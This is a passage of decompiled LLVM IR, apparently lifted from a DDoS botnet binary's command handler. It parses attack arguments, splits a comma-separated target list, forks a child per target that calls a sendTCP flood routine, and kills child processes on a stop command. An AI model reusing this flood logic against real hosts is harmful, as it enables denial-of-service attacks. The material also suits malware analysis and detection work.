  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_80504af = call i32 @atol(i32 %v2_80504a9)
  %v5_80504b7 = icmp ne i32 %v1_80504af, -1
  store i1 %v5_80504b7, i1* %cf.global-to-local, align 1
  %v10_80504b7 = icmp eq i32 %v1_80504af, -1
  br i1 %v10_80504b7, label %dec_label_pc_8050819, label %dec_label_pc_80504c0

dec_label_pc_80504c0:                             ; preds = %dec_label_pc_80504a3
  %v1_80504c3 = add i32 %tmp224, 16
  %v1_80504c6 = inttoptr i32 %v1_80504c3 to i32*
  %v2_80504c6 = load i32, i32* %v1_80504c6, align 4
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_80504cc = call i32 @atol(i32 %v2_80504c6)
  %v5_80504d4 = icmp ne i32 %v1_80504cc, -1
  store i1 %v5_80504d4, i1* %cf.global-to-local, align 1
  %v10_80504d4 = icmp eq i32 %v1_80504cc, -1
  br i1 %v10_80504d4, label %dec_label_pc_8050819, label %dec_label_pc_80504dd

dec_label_pc_80504dd:                             ; preds = %dec_label_pc_80504c0
  %v2_80504e3 = load i32, i32* %v1_80504c6, align 4
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_80504e9 = call i32 @atol(i32 %v2_80504e3)
  %v1_80504f1 = add i32 %v1_80504e9, -32
  %v2_80504f1 = icmp ult i32 %v1_80504e9, 32
  %v3_80504f1 = sub i32 31, %v1_80504e9
  %v4_80504f1 = and i32 %v3_80504f1, %v1_80504e9
  %v5_80504f1 = icmp slt i32 %v4_80504f1, 0
  store i1 %v2_80504f1, i1* %cf.global-to-local, align 1
  %v6_80504f1 = icmp eq i32 %v1_80504f1, 0
  %v7_80504f1 = icmp slt i32 %v1_80504f1, 0
  %v3_80504f4 = icmp eq i1 %v7_80504f1, %v5_80504f1
  %v4_80504f4 = icmp eq i1 %v6_80504f1, false
  %v5_80504f4 = and i1 %v4_80504f4, %v3_80504f4
  br i1 %v5_80504f4, label %dec_label_pc_8050819, label %dec_label_pc_80504fa

dec_label_pc_80504fa:                             ; preds = %dec_label_pc_80504dd
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_80504fe = icmp sgt i32 %tmp208, 6
  br i1 %v7_80504fe, label %dec_label_pc_8050500, label %dec_label_pc_805051c.thread

dec_label_pc_805051c.thread:                      ; preds = %dec_label_pc_80504fa
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_805053f

dec_label_pc_8050500:                             ; preds = %dec_label_pc_80504fa
  %v1_8050503 = add i32 %tmp224, 24
  %v1_8050506 = inttoptr i32 %v1_8050503 to i32*
  %v2_8050506 = load i32, i32* %v1_8050506, align 4
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_805050c = call i32 @atol(i32 %v2_8050506)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_8050514 = icmp slt i32 %v1_805050c, 0
  br i1 %v2_8050514, label %dec_label_pc_8050819, label %dec_label_pc_805051c

dec_label_pc_805051c:                             ; preds = %dec_label_pc_8050500
  %v8_805051c = icmp ult i32 %tmp208, 8
  store i1 %v8_805051c, i1* %cf.global-to-local, align 1
  %v12_805051c = icmp eq i32 %tmp208, 8
  %v1_8050520 = icmp eq i1 %v12_805051c, false
  br i1 %v1_8050520, label %dec_label_pc_805053f, label %dec_label_pc_8050522

dec_label_pc_8050522:                             ; preds = %dec_label_pc_805051c
  %v1_8050525 = add i32 %tmp224, 28
  %v1_8050528 = inttoptr i32 %v1_8050525 to i32*
  %v2_8050528 = load i32, i32* %v1_8050528, align 4
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_805052e = call i32 @atol(i32 %v2_8050528)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp271 = icmp slt i32 %v1_805052e, 1
  %tmp272 = icmp eq i1 %tmp271, false
  br i1 %tmp272, label %dec_label_pc_805053f, label %dec_label_pc_8050819

dec_label_pc_805053f:                             ; preds = %dec_label_pc_805051c.thread, %dec_label_pc_8050522, %dec_label_pc_805051c
  %v8_805051c276 = phi i1 [ true, %dec_label_pc_805051c.thread ], [ %v8_805051c, %dec_label_pc_8050522 ], [ %v8_805051c, %dec_label_pc_805051c ]
  %v1_8050520278 = phi i1 [ true, %dec_label_pc_805051c.thread ], [ false, %dec_label_pc_8050522 ], [ true, %dec_label_pc_805051c ]
  %v1_8050542 = add i32 %tmp224, 4
  %v1_8050545 = inttoptr i32 %v1_8050542 to i32*
  %v2_8050545 = load i32, i32* %v1_8050545, align 4
  %v2_8050550 = load i32, i32* %v1_80504a9, align 4
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_8050556 = call i32 @atol(i32 %v2_8050550)
  %v2_8050567 = load i32, i32* %v1_805048c, align 4
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_805056d = call i32 @atol(i32 %v2_8050567)
  %v2_805057e = load i32, i32* %v1_80504c6, align 4
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_8050584 = call i32 @atol(i32 %v2_805057e)
  %v1_8050592 = add i32 %tmp224, 20
  %v1_8050595 = inttoptr i32 %v1_8050592 to i32*
  %v2_8050595 = load i32, i32* %v1_8050595, align 4
  store i1 %v8_805051c276, i1* %cf.global-to-local, align 1
  br i1 %v1_8050520278, label %dec_label_pc_80505c6, label %dec_label_pc_80505a0

dec_label_pc_80505a0:                             ; preds = %dec_label_pc_805053f
  %v1_80505a3 = add i32 %tmp224, 28
  %v1_80505a6 = inttoptr i32 %v1_80505a3 to i32*
  %v2_80505a6 = load i32, i32* %v1_80505a6, align 4
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_80505ac = call i32 @atol(i32 %v2_80505a6)
  %v0_80505b1 = load i32, i32* @esp, align 4
  %v2_80505b1 = icmp ugt i32 %v0_80505b1, -17
  store i1 %v2_80505b1, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80505c6

dec_label_pc_80505c6:                             ; preds = %dec_label_pc_805053f, %dec_label_pc_80505a0
  %storemerge42 = phi i32 [ %v1_80505ac, %dec_label_pc_80505a0 ], [ 10, %dec_label_pc_805053f ]
  store i32 %storemerge42, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_80504fe, label %dec_label_pc_80505d5, label %dec_label_pc_80505fb

dec_label_pc_80505d5:                             ; preds = %dec_label_pc_80505c6
  %v1_80505d8 = add i32 %tmp224, 24
  %v1_80505db = inttoptr i32 %v1_80505d8 to i32*
  %v2_80505db = load i32, i32* %v1_80505db, align 4
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_80505e1 = call i32 @atol(i32 %v2_80505db)
  %v0_80505e6 = load i32, i32* @esp, align 4
  %v2_80505e6 = icmp ugt i32 %v0_80505e6, -17
  store i1 %v2_80505e6, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80505fb

dec_label_pc_80505fb:                             ; preds = %dec_label_pc_80505c6, %dec_label_pc_80505d5
  %storemerge41 = phi i32 [ %v1_80505e1, %dec_label_pc_80505d5 ], [ 0, %dec_label_pc_80505c6 ]
  store i32 %storemerge41, i32* @edi, align 4
  %v5_8050607 = icmp ult i32* %stack_var_-508, inttoptr (i32 8 to i32*)
  store i1 %v5_8050607, i1* %cf.global-to-local, align 1
  %v2_805060d = inttoptr i32 %v2_8050545 to i8*
  %v3_805060d = call i32 @__GI_strchr(i8* %v2_805060d, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050615 = icmp eq i32 %v3_805060d, 0
  br i1 %v1_8050615, label %dec_label_pc_8050682, label %dec_label_pc_8050619

dec_label_pc_8050619:                             ; preds = %dec_label_pc_80505fb
  store i32 %v2_8050545, i32* @eax, align 4
  store i1 %v5_8050607, i1* %cf.global-to-local, align 1
  %v2_8050625 = call i32 @__GI_strtok(i32 %v2_8050545, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805067a286 = icmp eq i32 %v2_8050625, 0
  %v1_805067e287 = icmp eq i1 %v4_805067a286, false
  br i1 %v1_805067e287, label %dec_label_pc_8050632, label %dec_label_pc_80506b9

dec_label_pc_8050632:                             ; preds = %dec_label_pc_8050619, %dec_label_pc_8050665
  %storemerge120288 = phi i32 [ %v2_805066f, %dec_label_pc_8050665 ], [ %v2_8050625, %dec_label_pc_8050619 ]
  %v0_8050632 = call i32 @listFork()
  store i32 %v0_8050632, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050637 = icmp eq i32 %v0_8050632, 0
  %v1_8050639 = icmp eq i1 %v1_8050637, false
  %v0_8050665 = load i32, i32* @esp, align 4
  br i1 %v1_8050639, label %dec_label_pc_8050665, label %dec_label_pc_805063b

dec_label_pc_805063b:                             ; preds = %dec_label_pc_8050632
  %v5_805063b = icmp ult i32 %v0_8050665, 4
  store i1 %v5_805063b, i1* %cf.global-to-local, align 1
  %v7_8050653 = inttoptr i32 %v2_8050595 to i8*
  %v8_8050653 = call i32 @sendTCP(i32 %storemerge120288, i32 %v1_8050556, i32 %v1_805056d, i32 %v1_8050584, i8* %v7_8050653, i32 %storemerge41, i32 %storemerge42)
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_8050660 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050665:                             ; preds = %dec_label_pc_8050632
  %v5_8050665 = icmp ult i32 %v0_8050665, 8
  store i1 %v5_8050665, i1* %cf.global-to-local, align 1
  %v2_805066f = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805067a = icmp eq i32 %v2_805066f, 0
  %v1_805067e = icmp eq i1 %v4_805067a, false
  br i1 %v1_805067e, label %dec_label_pc_8050632, label %dec_label_pc_80506b9

dec_label_pc_8050682:                             ; preds = %dec_label_pc_80505fb
  %v0_8050682 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050687 = icmp eq i32 %v0_8050682, 0
  %v1_8050689 = icmp eq i1 %v1_8050687, false
  br i1 %v1_8050689, label %dec_label_pc_8050819, label %dec_label_pc_805068f

dec_label_pc_805068f:                             ; preds = %dec_label_pc_8050682
  %v0_805068f = load i32, i32* @esp, align 4
  %v5_805068f = icmp ult i32 %v0_805068f, 4
  store i1 %v5_805068f, i1* %cf.global-to-local, align 1
  %v7_80506a7 = inttoptr i32 %v2_8050595 to i8*
  %v8_80506a7 = call i32 @sendTCP(i32 %v2_8050545, i32 %v1_8050556, i32 %v1_805056d, i32 %v1_8050584, i8* %v7_80506a7, i32 %storemerge41, i32 %storemerge42)
  store i1 %v5_80504ab, i1* %cf.global-to-local, align 1
  %v1_80506b4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80506b9:                             ; preds = %dec_label_pc_8050619, %dec_label_pc_8050665, %dec_label_pc_8050431
  %v2_80506bc = load i32, i32* %v1_804f3fa, align 4
  %v4_80506d9 = inttoptr i32 %v2_80506bc to i8*
  %v7_80506eb = call i32 @_strncmp(i8* %v4_80506d9, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aea7.453, i32 0, i32 0), i32 5)
  %v8_80506eb = urem i32 %v7_80506eb, 2
  %v9_80506eb = icmp eq i32 %v8_80506eb, 0
  %v0_80506ed = load i1, i1* %cf.global-to-local, align 1
  %v2_80506ed = or i1 %v0_80506ed, %v9_80506eb
  %v3_80506ed = zext i1 %v2_80506ed to i32
  %v4_80506ed = load i32, i32* @edx, align 4
  %v5_80506ed = and i32 %v4_80506ed, -256
  %v6_80506ed = or i32 %v3_80506ed, %v5_80506ed
  %v7_80506ed = xor i32 %v6_80506ed, 1
  store i32 %v7_80506ed, i32* %edx.global-to-local, align 4
  %v1_80506f5 = trunc i32 %v7_80506ed to i8
  %v3_80506f5 = zext i1 %v0_80506ed to i8
  %v15_80506f5 = icmp eq i8 %v1_80506f5, %v3_80506f5
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80506fe = icmp eq i1 %v15_80506f5, false
  br i1 %v1_80506fe, label %dec_label_pc_80507c8, label %dec_label_pc_805076b.preheader

dec_label_pc_805076b.preheader:                   ; preds = %dec_label_pc_80506b9
  br label %dec_label_pc_805076b

dec_label_pc_8050714:                             ; preds = %dec_label_pc_80507a8, %dec_label_pc_805076b
  %v2_8050717 = mul i32 %storemerge, 4
  store i32 %v2_8050717, i32* %edx.global-to-local, align 4
  %v0_805071c = load i32, i32* @global_var_8063714.25, align 4
  %v2_8050721 = add i32 %v0_805071c, %v2_8050717
  %v1_8050724 = inttoptr i32 %v2_8050721 to i32*
  %v2_8050724 = load i32, i32* %v1_8050724, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050726 = icmp eq i32 %v2_8050724, 0
  br i1 %v1_8050726, label %dec_label_pc_8050768, label %dec_label_pc_805072a

dec_label_pc_805072a:                             ; preds = %dec_label_pc_8050714
  %v9_8050717 = and i32 %storemerge, 1073741824
  %v10_8050717 = icmp ne i32 %v9_8050717, 0
  store i1 %v10_8050717, i1* %cf.global-to-local, align 1
  store i32 %v2_8050717, i32* %edx.global-to-local, align 4
  %v2_805073a = load i32, i32* %v1_8050724, align 4
  store i32 %v2_805073a, i32* @ebx, align 4
  %v0_805073c = call i32 @__libc_getpid()
  %v0_8050741 = load i32, i32* @ebx, align 4
  %v7_8050741 = icmp ult i32 %v0_8050741, %v0_805073c
  store i1 %v7_8050741, i1* %cf.global-to-local, align 1
  %v12_8050741 = icmp eq i32 %v0_8050741, %v0_805073c
  br i1 %v12_8050741, label %dec_label_pc_8050768, label %dec_label_pc_8050745

dec_label_pc_8050745:                             ; preds = %dec_label_pc_805072a
  store i32 %v2_8050717, i32* %edx.global-to-local, align 4
  %v0_805074d = load i32, i32* @global_var_8063714.25, align 4
  %v2_8050752 = add i32 %v0_805074d, %v2_8050717
  %v1_8050755 = inttoptr i32 %v2_8050752 to i32*
  %v2_8050755 = load i32, i32* %v1_8050755, align 4
  %v0_8050757 = load i32, i32* @esp, align 4
  %v5_8050757 = icmp ult i32 %v0_8050757, 8
  store i1 %v5_8050757, i1* %cf.global-to-local, align 1
  %v2_805075d = call i32 @kill(i32 %v2_8050755, i32 9)
  %v0_8050762 = load i32, i32* @esp, align 4
  %v2_8050762 = icmp ugt i32 %v0_8050762, -17
  store i1 %v2_8050762, i1* %cf.global-to-local, align 1
  %v4_8050765 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_8050768

dec_label_pc_8050768:                             ; preds = %dec_label_pc_805072a, %dec_label_pc_8050714, %dec_label_pc_8050745
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8050714 ], [ %stack_var_-28.1, %dec_label_pc_805072a ], [ %v4_8050765, %dec_label_pc_8050745 ]
  %v4_8050768 = add i32 %storemerge, 1
  br label %dec_label_pc_805076b

dec_label_pc_805076b:                             ; preds = %dec_label_pc_805076b.preheader, %dec_label_pc_8050768
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8050768 ], [ 0, %dec_label_pc_805076b.preheader ]
  %storemerge = phi i32 [ %v4_8050768, %dec_label_pc_8050768 ], [ 0, %dec_label_pc_805076b.preheader ]
  %v0_805077f = load i32, i32* @global_var_805d488.23, align 8
  %v0_8050784 = load i32, i32* @global_var_805d48c.24, align 4
  store i32 %v0_8050784, i32* %edx.global-to-local, align 4
  %v10_805079c = icmp ne i32 %v0_8050784, 0
  store i1 %v10_805079c, i1* %cf.global-to-local, align 1
  br i1 %v10_805079c, label %dec_label_pc_8050714, label %dec_label_pc_80507a8

dec_label_pc_80507a8:                             ; preds = %dec_label_pc_805076b
  %v10_80507bc = icmp ult i32 %storemerge, %v0_805077f
  store i1 %v10_80507bc, i1* %cf.global-to-local, align 1
  br i1 %v10_80507bc, label %dec_label_pc_8050714, label %dec_label_pc_80507c8

dec_label_pc_80507c8:                             ; preds = %dec_label_pc_80507a8, %dec_label_pc_80506b9
  %v2_80507cb = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_80507e8 = inttoptr i32 %v2_80507cb to i8*
  store i32 ptrtoint ([12 x i8]* @global_var_805aeac.454 to i32), i32* @edi, align 4
  %v7_80507fa = call i32 @_strncmp(i8* %v4_80507e8, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805aeac.454, i32 0, i32 0), i32 12)
  %v8_80507fa = urem i32 %v7_80507fa, 2
  %v9_80507fa = icmp eq i32 %v8_80507fa, 0
  %v0_80507fc = load i1, i1* %cf.global-to-local, align 1
  %v2_80507fc = or i1 %v0_80507fc, %v9_80507fa
  %v3_80507fc = zext i1 %v2_80507fc to i32
  %v4_80507fc = load i32, i32* %edx.global-to-local, align 4
  %v5_80507fc = and i32 %v4_80507fc, -256
  %v6_80507fc = or i32 %v3_80507fc, %v5_80507fc
  %v7_80507fc = xor i32 %v6_80507fc, 1
  store i32 %v7_80507fc, i32* %edx.global-to-local, align 4
  %v1_8050804 = trunc i32 %v7_80507fc to i8
  %v3_8050804 = zext i1 %v0_80507fc to i8
  %v4_8050804 = sub nsw i8 %v1_8050804, %v3_8050804
  %v15_8050804 = icmp eq i8 %v4_8050804, 0
  %v2_8050808 = sext i8 %v4_8050804 to i32
  store i32 %v2_8050808, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805080d = icmp eq i1 %v15_8050804, false
  br i1 %v1_805080d, label %dec_label_pc_8050819, label %dec_label_pc_805080f

dec_label_pc_805080f:                             ; preds = %dec_label_pc_80507c8
  %v0_805080f = load i32, i32* @esp, align 4
  %v5_805080f = icmp ult i32 %v0_805080f, 12
  store i1 %v5_805080f, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_8050814 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8050819

dec_label_pc_8050819:                             ; preds = %dec_label_pc_8050522, %dec_label_pc_805033e, %dec_label_pc_8050175, %dec_label_pc_8050000, %dec_label_pc_804fc46, %dec_label_pc_804fa09, %dec_label_pc_804f87b, %dec_label_pc_805047c, %dec_label_pc_8050318, %dec_label_pc_805014f, %dec_label_pc_804ffda, %dec_label_pc_804fe0e, %dec_label_pc_804fb86, %dec_label_pc_804f9e3, %dec_label_pc_804f855, %dec_label_pc_80507c8, %dec_label_pc_8050682, %dec_label_pc_8050500, %dec_label_pc_80504dd, %dec_label_pc_80504c0, %dec_label_pc_80504a3, %dec_label_pc_8050486, %dec_label_pc_8050406, %dec_label_pc_8050322, %dec_label_pc_805027a, %dec_label_pc_804fc23, %dec_label_pc_804fc04, %dec_label_pc_804fbe7, %dec_label_pc_804fbca, %dec_label_pc_804fbad, %dec_label_pc_804fb90, %dec_label_pc_804fb07, %dec_label_pc_804f9ed, %dec_label_pc_804f964, %dec_label_pc_804f85f, %dec_label_pc_804f791, %dec_label_pc_804f6fd, %dec_label_pc_804f673, %dec_label_pc_8050159, %dec_label_pc_80500d9, %dec_label_pc_804ffe4, %dec_label_pc_804ff03, %dec_label_pc_804fd89, %dec_label_pc_804f71e, %dec_label_pc_804f60e, %dec_label_pc_804f4a0, %dec_label_pc_804f43e, %dec_label_pc_805080f
  %v0_8050820 = phi i32 [ %v1_805052e, %dec_label_pc_8050522 ], [ %v1_805034a, %dec_label_pc_805033e ], [ %v1_8050181, %dec_label_pc_8050175 ], [ %v1_805000c, %dec_label_pc_8050000 ], [ %v1_804fc52, %dec_label_pc_804fc46 ], [ %v1_804fa15, %dec_label_pc_804fa09 ], [ %v1_804f887, %dec_label_pc_804f87b ], [ %v2_8050471, %dec_label_pc_805047c ], [ %v2_805030d, %dec_label_pc_8050318 ], [ %v2_8050144, %dec_label_pc_805014f ], [ %v2_804ffcf, %dec_label_pc_804ffda ], [ %v2_804fe03, %dec_label_pc_804fe0e ], [ %v2_804fb7b, %dec_label_pc_804fb86 ], [ %v2_804f9d8, %dec_label_pc_804f9e3 ], [ %v2_804f84a, %dec_label_pc_804f855 ], [ %v2_8050808, %dec_label_pc_80507c8 ], [ %v0_8050682, %dec_label_pc_8050682 ], [ %v1_805050c, %dec_label_pc_8050500 ], [ %v1_80504e9, %dec_label_pc_80504dd ], [ -1, %dec_label_pc_80504c0 ], [ -1, %dec_label_pc_80504a3 ], [ -1, %dec_label_pc_8050486 ], [ %v0_8050406, %dec_label_pc_8050406 ], [ %v1_805032e, %dec_label_pc_8050322 ], [ %v0_805027a, %dec_label_pc_805027a ], [ %v1_804fc2f, %dec_label_pc_804fc23 ], [ %v1_804fc10, %dec_label_pc_804fc04 ], [ -1, %dec_label_pc_804fbe7 ], [ -1, %dec_label_pc_804fbca ], [ -1, %dec_label_pc_804fbad ], [ -1, %dec_label_pc_804fb90 ], [ %v0_804fb07, %dec_label_pc_804fb07 ], [ %v1_804f9f9, %dec_label_pc_804f9ed ], [ %v0_804f964, %dec_label_pc_804f964 ], [ %v1_804f86b, %dec_label_pc_804f85f ], [ %v2_804f78a, %dec_label_pc_804f791 ], [ %v0_804f6fd, %dec_label_pc_804f6fd ], [ 0, %dec_label_pc_804f673 ], [ %v1_8050165, %dec_label_pc_8050159 ], [ %v0_80500d9, %dec_label_pc_80500d9 ], [ %v1_804fff0, %dec_label_pc_804ffe4 ], [ %v0_804ff03, %dec_label_pc_804ff03 ], [ %v0_804fd89, %dec_label_pc_804fd89 ], [ %v1_804f70a, %dec_label_pc_804f71e ], [ %v3_804f61c, %dec_label_pc_804f60e ], [ %v3_804f4c1, %dec_label_pc_804f4a0 ], [ %v3_804f44c, %dec_label_pc_804f43e ], [ %v1_8050814, %dec_label_pc_805080f ]
  %v2_805081c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805081c, i32* @ebx, align 4
  store i32 %v0_804f3ef, i32* @esi, align 4
  store i32 %v0_804f3ee, i32* @edi, align 4
  ret i32 %v0_8050820

; uselistorder directives
  uselistorder i1 %v0_80507fc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_8050717, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_80506ed, { 1, 0 }
  uselistorder i32 %v2_805066f, { 1, 0 }
  uselistorder i32 %v0_8050665, { 1, 0 }
  uselistorder i1 %v5_8050607, { 1, 0 }
  uselistorder i32 %v2_8050545, { 3, 0, 2, 1 }
  uselistorder i32 %v1_80504f1, { 1, 0 }
  uselistorder i32 %v1_80504e9, { 1, 0, 4, 2, 3 }
  uselistorder i1 %v5_80504ab, { 1, 0, 11, 8, 7, 6, 10, 9, 5, 4, 3, 2 }
  uselistorder i1 %v0_8050465, { 1, 0 }
  uselistorder i32 %v2_80503f3, { 1, 0 }
  uselistorder i32 %v0_80503e9, { 1, 0 }
  uselistorder i32 %v2_8050361, { 3, 0, 2, 1 }
  uselistorder i1 %v5_8050346, { 1, 0, 4, 3, 2 }
  uselistorder i1 %v0_8050301, { 1, 0 }
  uselistorder i32 %v2_8050267, { 1, 0 }
  uselistorder i32 %v0_805025d, { 1, 0 }
  uselistorder i32 %storemerge118294, { 2, 1, 0 }
  uselistorder i32 %v2_8050198, { 3, 4, 5, 0, 2, 1 }
  uselistorder i1 %v5_805017d, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v0_8050138, { 1, 0 }
  uselistorder i32 %v2_80500c6, { 1, 0 }
  uselistorder i32 %v0_80500a1, { 1, 0 }
  uselistorder i32 %v0_80500bc, { 1, 0 }
  uselistorder i32 %storemerge45297, { 1, 0 }
  uselistorder i32 %v2_8050045, { 1, 0 }
  uselistorder i32 %v2_805002e, { 1, 0 }
  uselistorder i32 %v2_8050023, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i1 %v5_8050008, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %v2_8050006, { 1, 0 }
  uselistorder i32 %v2_804ffea, { 1, 0 }
  uselistorder i1 %v0_804ffc3, { 1, 0 }
  uselistorder i32 %v2_804ff4c, { 1, 0 }
  uselistorder i1 %v5_804ff2e, { 0, 2, 1 }
  uselistorder i32 %v2_804ff2c, { 1, 0 }
  uselistorder i32 %v2_804ff16, { 1, 0 }
  uselistorder i32 %v2_804fe9c, { 1, 0 }
  uselistorder i1 %v5_804fe7e, { 0, 2, 1 }
  uselistorder i32 %v2_804fe7c, { 1, 0 }
  uselistorder i32 %v2_804fe66, { 1, 0 }
  uselistorder i1 %v5_804fe3e, { 1, 0 }
  uselistorder i32 %v2_804fe3c, { 1, 0, 2 }
  uselistorder i32 %v2_804fe1e, { 1, 0 }
  uselistorder i32* %v1_804fe1e, { 2, 0, 1, 3 }
  uselistorder i1 %v0_804fdf7, { 1, 0 }
  uselistorder i32 %v7_804fdf5, { 1, 0 }
  uselistorder i32 %v2_804fd76, { 1, 0 }
  uselistorder i1 %v5_804fd0b, { 1, 0 }
  uselistorder i32 %v2_804fcdc, { 1, 0 }
  uselistorder i32 %v1_804fcc5, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804fcbf, { 1, 0 }
  uselistorder i32 %v2_804fca8, { 1, 0 }
  uselistorder i32 %v2_804fc91, { 1, 0 }
  uselistorder i32 %v2_804fc77, { 1, 0 }
  uselistorder i32 %v2_804fc69, { 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_804fc4c, { 1, 0 }
  uselistorder i32 %v1_804fc37, { 1, 0 }
  uselistorder i32 %v1_804fc2f, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804fc29, { 1, 0 }
  uselistorder i32 %v1_804fc18, { 1, 0 }
  uselistorder i32 %v1_804fc10, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804fc0a, { 1, 0 }
  uselistorder i32 %v2_804fbed, { 1, 0 }
  uselistorder i32 %v2_804fbd0, { 1, 0 }
  uselistorder i1 %v5_804fbb5, { 1, 0, 11, 10, 9, 8, 12, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v2_804fbb3, { 1, 0 }
  uselistorder i32 %v2_804fb96, { 1, 0 }
  uselistorder i1 %v0_804fb6f, { 1, 0 }
  uselistorder i32 %v2_804faee, { 1, 0 }
  uselistorder i32 %v0_804fac9, { 1, 0 }
  uselistorder i32 %v0_804fae4, { 1, 0 }
  uselistorder i32 %v2_804fa54, { 1, 0 }
  uselistorder i32 %v2_804fa3a, { 1, 0 }
  uselistorder i32 %v2_804fa2c, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i1 %v5_804fa11, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %v2_804fa0f, { 1, 0 }
  uselistorder i32 %v2_804f9f3, { 1, 0 }
  uselistorder i1 %v0_804f9cc, { 1, 0 }
  uselistorder i32 %v2_804f94b, { 1, 0 }
  uselistorder i32 %v0_804f941, { 1, 0 }
  uselistorder i32 %v2_804f8c6, { 1, 0 }
  uselistorder i32 %v2_804f8ac, { 1, 0 }
  uselistorder i32 %v2_804f89e, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i1 %v5_804f883, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_804f881, { 1, 0 }
  uselistorder i32 %v2_804f865, { 1, 0 }
  uselistorder i1 %v0_804f83e, { 1, 0 }
  uselistorder i32 %v0_804f7e5, { 1, 0 }
  uselistorder i1 %v0_804f7d2, { 1, 0 }
  uselistorder i1 %v0_804f77e, { 1, 0 }
  uselistorder i1 %v0_804f6ea, { 1, 0 }
  uselistorder i32 %v0_804f693, { 1, 0 }
  uselistorder i32 %v0_804f673, { 1, 0, 2 }
  uselistorder i1 %v0_804f660, { 1, 0 }
  uselistorder i32 %v0_804f60e, { 1, 0 }
  uselistorder i1 %v0_804f5f1, { 1, 0 }
  uselistorder i1 %v0_804f57c, { 1, 0 }
  uselistorder i32 %v0_804f51e, { 1, 0 }
  uselistorder i1 %v0_804f502, { 1, 0 }
  uselistorder i32 %v0_804f4b1, { 1, 0, 2 }
  uselistorder i1 %v0_804f48d, { 1, 0 }
  uselistorder i32 %v0_804f43e, { 1, 0 }
  uselistorder i1 %v0_804f42b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-460, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-492, { 9, 3, 0, 1, 2, 4, 5, 6, 10, 7, 11, 8, 12, 13 }
  uselistorder i32* %stack_var_-508, { 4, 0, 1, 3, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70 }
  uselistorder i32 %tmp224, { 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4, 1, 2, 0 }
  uselistorder i32 %tmp208, { 0, 24, 4, 5, 23, 6, 22, 7, 21, 8, 20, 9, 19, 1, 18, 10, 17, 11, 16, 12, 15, 2, 14, 3, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 5, 4, 1, 2, 3, 6, 20, 21, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17, 18, 19 }
